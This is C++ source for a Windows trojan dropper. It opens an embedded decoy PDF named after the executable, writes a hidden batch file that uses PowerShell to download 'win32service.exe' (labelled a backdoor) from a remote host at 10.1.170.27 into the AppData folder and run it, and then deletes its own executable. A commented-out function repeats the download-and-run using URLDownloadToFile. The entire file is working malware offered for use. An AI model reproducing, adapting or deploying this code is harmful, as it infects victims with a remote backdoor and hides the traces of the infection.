#include <fstream>
#include <iostream>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <Windows.h>
#include <string>
#include <urlmon.h>
#include <filesystem>
#pragma comment(lib, "urlmon.lib")
using namespace std;

// https://tomeko.net/online_tools/file_to_hex.php?lang=en
unsigned char pdfData[] = { /*paste pdf data here*/ };
size_t pdfDataSize = sizeof(pdfData) / sizeof(pdfData[0]);
void createPDF(std::string filePath)
{
    std::ofstream outFile(filePath, std::ios::out | std::ios::binary);
    if (!outFile)
        return;
    outFile.write(reinterpret_cast<const char*>(pdfData), pdfDataSize);
    outFile.close();
}

void openPDFNonBlocking(const std::string& filePath)
{
    std::wstring wideFilePath = std::wstring(filePath.begin(), filePath.end());
    LPCWSTR lpcwFilePath = wideFilePath.c_str();
    ShellExecute(NULL, L"open", lpcwFilePath, NULL, NULL, SW_HIDE);
}

void CreateDownloaderBat()
{
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string batFilePath = std::string(tempPath) + "temp_downloader.bat";
    std::string downloadScript = R"(
@echo off
setlocal
set "APPDATA_PATH=%APPDATA%"
set "DIRECTORY=%APPDATA_PATH%\Windows Service\"
if not exist "%DIRECTORY%" mkdir "%DIRECTORY%"
set "URL=http://10.1.170.27:8000/win32service.exe"
set "BACKDOOR_PATH=%DIRECTORY%win32service.exe"
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%BACKDOOR_PATH%') "
start /b "" "%BACKDOOR_PATH%"
endlocal
)";

    std::ofstream batFile(batFilePath);
    batFile << downloadScript;
    batFile.close();
    std::wstring wideBatFilePath = std::wstring(batFilePath.begin(), batFilePath.end());
    ShellExecute(NULL, L"open", wideBatFilePath.c_str(), NULL, NULL, SW_HIDE);
}

// void downloadbackdoor()
// {
//     char* appDataCStr;
//     size_t len;
//     _dupenv_s(&appDataCStr, &len, "AppData");
//     std::string appData = appDataCStr;
//     free(appDataCStr);
//     std::string filePath = appData + "\\Windows Service\\";
//     std::filesystem::create_directories(filePath);
//     string URL = "http://10.1.170.27:8000/hello.cpp";
//     string Backdoorpath = filePath + "win32service.exe";
//     wstring tempUrl = wstring(URL.begin(), URL.end());
//     wstring tempBackdoorpath = wstring(Backdoorpath.begin(), Backdoorpath.end());
//     LPCWSTR url = tempUrl.c_str();
//     LPCWSTR backdoorpath = tempBackdoorpath.c_str();
//     if (S_OK == URLDownloadToFile(NULL, url, backdoorpath, 0, NULL))
//         ShellExecute(NULL, L"open", backdoorpath, NULL, NULL, SW_HIDE); // Use SW_HIDE to hide the window
// }

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    wchar_t exeFilePath[MAX_PATH];
    GetModuleFileNameW(NULL, exeFilePath, MAX_PATH);
    char narrowExeFilePath[MAX_PATH];
    size_t convertedChars = 0;
    wcstombs_s(&convertedChars, narrowExeFilePath, MAX_PATH, exeFilePath, MAX_PATH);
    string myexefilepath = narrowExeFilePath;
    string myexefilename = myexefilepath.substr(myexefilepath.find_last_of("\\") + 1);
    myexefilename = myexefilename.substr(0, myexefilename.find_last_of("."));
    createPDF(myexefilename + ".pdf");
    openPDFNonBlocking(myexefilename + ".pdf");
    CreateDownloaderBat();

    // Delete the executable
    wchar_t command[256];
    swprintf_s(command, L"start /min cmd /c del %S", narrowExeFilePath); 
    ShellExecute(NULL, L"open", L"cmd.exe", command, NULL, SW_HIDE);
    return 0;
}
